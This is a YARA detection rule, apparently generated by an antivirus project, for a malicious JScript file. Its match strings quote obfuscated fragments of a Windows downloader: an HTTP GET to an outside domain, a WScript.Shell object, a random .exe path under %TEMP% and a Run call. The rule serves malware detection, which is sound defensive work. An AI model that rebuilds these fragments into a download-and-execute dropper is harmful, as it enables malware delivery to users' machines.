rule sig_20160330_1492205fb69df4ac4734e98109bbc2db {
  meta:
    description = "datamaliciousorder - file 20160330_1492205fb69df4ac4734e98109bbc2db.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a54415812b9098277dd20362293c9c77ede875ea9d2904a947c279fa64d8b38b"

  strings:
    $s1  = "_CT[_C](\"GET\", \"http://hollandfoodexchange.com/d7jsa\", false);" fullword ascii
    $s2  = "function _H(_AN, _JA){_AZ = _AZ * 1; return _AN - _JA;};" fullword ascii
    $s3  = "var _Q = function _Z() {return WScript[_W0](\"WScript\"+\".Shell\");}(), _HF = 11;" fullword ascii
    $s4  = "if (_CT[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _T() {return _Q[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"CFEpbm8oehxovN.ex\" + \"e\";};" fullword ascii
    $s6  = "function _ZB(){return _D + \"\";};" fullword ascii
    $s7  = "function _W(_MC){_Q[\"Run\"](_MC, _AZ, _AZ);};" fullword ascii
    $s8  = "function _R() {return ((_XR == true) && (_XR == _OP)) ? 1 : _AZ;};" fullword ascii
    $s9  = "function _KC(_P) {var _K = (1, 2, 3, 4, 5, _P); return _K;};" fullword ascii
    $s10 = "var _H0 = new this[\"Date\"]();" fullword ascii
    $s11 = " while (_Z0){" fullword ascii
    $s12 = "function _O(){return 22;};" fullword ascii
    $s13 = "function _AO()" fullword ascii
    $s14 = "function _WY(){return _W0;};" fullword ascii
    $s15 = "return _H(_C0, _FS);" fullword ascii
    $s16 = "_XR = true; " fullword ascii
    $s17 = "var _D0 = false;" fullword ascii
    $s18 = "var _XR = false;" fullword ascii
    $s19 = "var _OP = false;" fullword ascii
    $s20 = "_OP = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}